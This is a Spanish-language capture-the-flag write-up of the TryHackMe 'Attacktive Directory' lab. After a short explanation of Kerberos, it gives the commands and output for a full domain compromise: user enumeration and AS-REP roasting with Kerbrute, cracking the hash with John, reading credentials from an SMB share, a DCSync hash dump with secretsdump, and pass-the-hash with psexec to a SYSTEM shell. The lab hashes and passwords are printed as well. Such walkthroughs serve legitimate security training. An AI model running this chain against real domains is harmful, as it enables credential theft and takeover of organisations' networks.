---
title: Attacktive Directory
published: true
---

---

Laboratorio de [TryHackMe](https://tryhackme.com/r/room/attacktivedirectory) 

### Enumeración

Escaneo puertos abiertos y sus respectivos servicios y vesiones en cada uno.

```ruby
❯ sudo nmap -sCV -p- --open -T 5 -n -Pn 10.10.91.152
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.91.152
Host is up (0.26s latency).
Not shown: 64837 closed tcp ports (reset), 671 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-18 02:53:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2024-09-17T00:37:00
|_Not valid after:  2025-03-19T00:37:00
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-09-18T02:54:11+00:00
|_ssl-date: 2024-09-18T02:54:20+00:00; -1m36s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49825/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1m36s, deviation: 0s, median: -1m36s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-18T02:54:12
|_  start_date: N/A

```

Con el ouput del escaneo veo información como el **Domain Name** **Net-BIOS**, el **Domain Name** del **AD** y el nombre de la computadora.

![](https://eidd3.github.io/assets/img/AttacktiveDirect/info.png)

Con crackmapexec también se puede ver alguna de esta información.

```ruby
❯ crackmapexec smb 10.10.91.152
SMB         10.10.91.152    445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
```

Sabiendo el Domain Name lo agrego a el archivo _/etc/hosts_ para asociar el dominio a la **IP**.

![](https://eidd3.github.io/assets/img/AttacktiveDirect/hosts.png)


#### Kerberos

Kerberos es un protocolo de autenticación de red diseñado para proporcionar una comunicación segura entre los usuarios y los servicios en una red, asegurando que la autenticación sea confiable, incluso cuando se ejecuta en redes inseguras. 

#### **Componentes de Kerberos**:
1. **KDC (Key Distribution Center)**: Es el servidor central encargado de emitir los tickets y autenticar a los usuarios. El KDC tiene dos componentes:
* **AS (Authentication Server)**: Responsable de emitir el **TGT (Ticket Granting Ticket)**.
* **TGS (Ticket Granting Server)**: Responsable de emitir los tickets para los servicios especificos, basandose en el **TGT** del usuario.
2. **Ticket Granting Ticket (TGT)**: Un ticket que permite a los usuarios solicitar otros tickets para utilizar servicios en la red sin tener que autenticarse otra vez.
3. **Ticket Granting Server (TGS)**: Un ticket que permite a los usuarios acceder a un servicios especifico en la red, como un servidor de archivos o un recurso compartido.
4. **Claves de sesion**: Kerberos usa claves de sesión para cifrar la comunicación entre el cliente y el servicio, garantizando que la autenticación no pueda ser interceptada.


#### **Funcionamiento básico de Kerberos**:

Kerberos funciona a través de un **sistema de tickets** emitidos por un servidor central llamado **KDC** (Key Disrtribution Center, Centro de Distribucion de Claves). Este proceso tiene varios pasos:


#### Autenticación inicial:
1. El usuario ingresa su nombre de usuario y contraseña y solicita un **TGT (Ticket Granting Ticket)** al **KDC**. 
2. El **KDC** verifica las credenciales y responde con un **TGT** que está cifrado y solo el **KDC** puede desencriptar. El **TGT** es usado por el usuario para solicitar acceso a otros servicios en la red sin tener que aportrar su contraseña otra vez.

#### Obtención de un Ticket de Servicio:
1. Para acceder a un servicio de red (como un servidor _sql_) el usuario debe presentar el **TGT** al **KDC** para obtener un **TGS (Ticket Granting Service)**.
2. El **KDC** verifica el **TGT** y, si es válido, emite un **TGS** cifrado para el servicio solicitado.

#### Acceso al servicio:
1. El usuario presenta el **TGS** al servicio de red que desea usar. El servicio lo descifra y autentica al usuario sin que se necesiten mas credenciales.
2. Todo este proceso ocurre sin que la contraseña del usuario se transmita por la red.


Ahora, con un pantallaso de como funciona **Kerberos** y sabiendo que el puerto _88_ está abierto empiezo probando las vulnerabilidades más tipicas.

Con la herramienta **Kerbrute** enumero los posibles nombres de usuarios válidos.

> Resumido funcionamiento del ataque _userenum_:
1. Kerbrute envia solicitudes TGT sin autenticación previa. Si el KDC responde con un **PRINCIPAL UNKNOWN** error, el usuario no existe.
2. Sin emargo si el KDC solicita una autenticación previa, sabemos que el usuario existe.

Por defecto **Kerbrute** también efectúa un AS-Reproast atack, por lo que si un usuario es válido, también reportará el hash del **TGT**. 
Si esto no hubiera pasado también podría haber usado la herramienta GetNPUsers para extraer algún hash.

```ruby
❯ ./kerbrute userenum -d spookysec.local --dc 10.10.91.152 ../userlist.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - Ronnie Flathers @ropnop

17:17:08 >  Using KDC(s):
17:17:08 >   10.10.91.152:88

17:17:09 >  [+] VALID USERNAME:   james@spookysec.local
17:17:14 >  [+] svc-admin has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$svc-admin@SPOOKYSEC.LOCAL:855998927bf6b1c7ce4d54a90c0dbc45$371d4628031bc4c91e7af3acfb6dc52a07af50f8b66d6898025632b8febc044930976b8332fb542ea3852102dc22b0ec159db4aa1a9290ea7d26913c615a6c3c3db520d6c8a82d35ed6d3ad3f904559c913195a6ba5a7208b9c44160f34e1ccb1de173b62ca1d997139877dc8f50b24f9f981f53d196f0887379af842832bd0e2d55004b85bc1356647f8d2348b5c91adbb6499d7b7c493a6eaf0078722f91b1db7a14d67895faaa3275db15ccedb1317184a4c42960b3ef5a448ecd073e8121bd661e5da2fe43cd3c6b98d6742ef31c7c48c844f3332e8530e0948c57cabc013bd300b77e62f47d26a01b46fcb40f45bb658a428e0b696a0f4e730d520a4eb04aa8c6e2ad81
17:17:14 >  [+] VALID USERNAME:   svc-admin@spookysec.local
17:17:25 >  [+] VALID USERNAME:   robin@spookysec.local
17:17:51 >  [+] VALID USERNAME:   darkstar@spookysec.local
17:18:06 >  [+] VALID USERNAME:   administrator@spookysec.local
17:18:40 >  [+] VALID USERNAME:   backup@spookysec.local
17:18:54 >  [+] VALID USERNAME:   paradox@spookysec.local
17:43:47 >  [+] VALID USERNAME:   ori@spookysec.local
```

Y el usuario `svc-admin` no tiene _'pre-auth required'_, significa que el usuario está configurado para no requerir preautenticación en el protocolo Kerberos la hora de solicitar un **TGT**.

Ahora con John crackeo el hash.

```bash
❯ john -w=rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`svc-admin:management2005`

Valido las credenciales con crackmapexec y trato de enumerar recursos compratidos en el servicio SMB.

```bash
❯ crackmapexec smb 10.10.91.152 -u 'svc-admin' -p 'management2005'
SMB         10.10.91.152    445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.91.152    445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
```

```ruby
❯ smbmap -H 10.10.91.152 -u svc-admin -p management2005 --no-banner
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.91.152:445        Name: spookysec.local           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        backup                                                  READ ONLY        
        C$                                                      NO ACCESS        Default share
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                READ ONLY        Logon server share 
        SYSVOL                                                  READ ONLY        Logon server share 
[*] Closed 1 connections 
```

Veo un directorio _backup_ y enumero los archivos.

```ruby
❯ smbmap -H 10.10.91.152 -u svc-admin -p management2005 --no-banner -r backup
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.91.152:445        Name: spookysec.local           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS        Remote Admin
        backup                                                  READ ONLY        
        ./backup
        dr--r--r--                0 Sat Apr  4 15:08:39 2020    .
        dr--r--r--                0 Sat Apr  4 15:08:39 2020    ..
        fr--r--r--               48 Sat Apr  4 15:08:53 2020    backup_credentials.txt
        C$                                                      NO ACCESS        Default share
        IPC$                                                    READ ONLY        Remote IPC
        NETLOGON                                                READ ONLY        Logon server share 
        SYSVOL                                                  READ ONLY        Logon server share 
[*] Closed 1 connections                                                                                                     
```

Veo un archivo llamado **backup_credentials.txt** y lo descargo.

```ruby
❯ smbmap -H 10.10.91.152 -u svc-admin -p management2005 --no-banner --download backup/backup_credentials.txt
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
[+] Starting download: backup\backup_credentials.txt (48 bytes)                                                          
[+] File output to: /home/kali/TryHackme/AttacktiveDirectory/10.10.91.152-backup_backup_credentials.txt                  
[*] Closed 1 connections
```

El archivo contiene un hash, `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`. Lo primero que hago es tratar de decodificarlo en base64 y funciona.
Ahora tengo unas nuevas credenciales.

```ruby
❯ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d; echo
backup@spookysec.local:backup2517860
```

Las valido con crackmapexec.

```ruby
❯ crackmapexec smb 10.10.91.152 -u 'backup' -p 'backup2517860'
SMB         10.10.91.152     445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.91.152     445    ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860
```

### Elevando privilegios

>secretsdump es una herramienta incluida en la suite Impacket que se utiliza para extraer credenciales y hashes de equipos Windows de forma remota, sin necesidad de ejecutar código en el sistema objetivo. 

Para este ataque se usa el metodo DRSUAPI para obtener acceso al archivo NTDS.dit.

_drsuapi_ es una interfaz **RPC (Remote Procedure Call)** usada en sistemas Windows que forma parte del protocolo **DCE/RPC (Distributed Computing Environment / Remote Procedure Call)**. En el contexto de herramientas como _Impacket_ y ataques de **Active Directory**, _drsuapi_ es importante porque se utiliza para interactuar con **Active Directory** y acceder a ciertos tipos de datos sensibles, como los hashes de contraseñas almacenados en un controlador de dominio.

Usando **secretsdump** con esta nueva cuenta backup puedo tratar de extraer todos los hash de las contraseñas de los usuarios del dominio.

```ruby
❯ impacket-secretsdump spookysec.local/backup:@10.10.91.152
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:bbf175bbf4906f98c1a8676421c6b0a7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:d954006d1204c68658c1ab465d147849e8e072eee9de1bddad7a568056c23ab1
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:5169ecbda5d5ebfb71da2e5e202ab6f6
ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
[*] Cleaning up... 
```

>Pass-the-Hash (PtH) es una técnica de ataque que permite a un atacante autenticarse en un sistema remoto usando el hash de la contraseña en lugar de la contraseña en texto claro.

Con el hash NTLM extraído de los usuarios puedo hace Pass-the-Hash y reutilizar el hash del usuario Administrador para conectarme al sistema con psexec.

```ruby
❯ impacket-psexec spookysec.local/Administrator@10.10.91.152 -hashes :0e0363213e37b94221497260b0bcb4fc
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.91.152.....
[*] Found writable share ADMIN$
[*] Uploading file fUaZVvBW.exe
[*] Opening SVCManager on 10.10.91.152.....
[*] Creating service TDPn on 10.10.91.152.....
[*] Starting service TDPn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1490]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

